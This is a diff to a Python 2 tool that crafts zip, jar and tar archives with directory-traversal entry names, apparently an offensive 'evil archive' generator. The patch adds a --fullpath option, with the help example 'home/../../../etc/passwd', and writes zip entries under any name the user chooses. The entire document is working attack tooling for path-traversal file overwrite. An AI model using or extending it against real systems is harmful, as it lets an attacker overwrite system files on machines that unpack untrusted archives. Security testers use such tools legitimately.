@@ -43,6 +43,7 @@ def main(argv=sys.argv):
 	p.set_default("platform", "win")
 	p.add_option('--path', '-p', dest="path", help="Path to include in filename after traversal.  Ex: WINDOWS\\System32\\")	
 	p.set_default("path", "")
+        p.add_option('--fullpath','-l', dest="fullpath", help="Literal Path for more specific archive abuse. Ex: home/../../../etc/passwd")
 	options, arguments = p.parse_args()
 	
 	if len(arguments) != 1:
@@ -61,7 +62,10 @@ def main(argv=sys.argv):
 		if options.path and options.path[-1] != '/':
 			options.path += '/'
 
-	zpath = dir*options.depth+options.path+os.path.basename(fname)
+        if options.fullpath:
+            zpath = options.fullpath
+        else:
+	    zpath = dir*options.depth+options.path+os.path.basename(fname)
 	print "Creating " + options.out + " containing " + zpath;	
 	ext = os.path.splitext(options.out)[1]
 	if os.path.exists(options.out):
@@ -70,7 +74,13 @@ def main(argv=sys.argv):
 		wmode = 'w'
 	if ext == ".zip" or ext == ".jar":
 		zf = zipfile.ZipFile(options.out, wmode)
-		zf.write(fname, zpath)
+
+                # Reading the file into a string and then using writestr
+                # rather than write. This gives us more flexibility with
+                # the archive string name. If we need even more flexibility
+                # we might overload ZipFile.write or ZipFile.writestr
+                file_data = open(fname).read()
+		zf.writestr(zpath,file_data)
 		zf.close()
 		return
 	elif ext == ".tar":
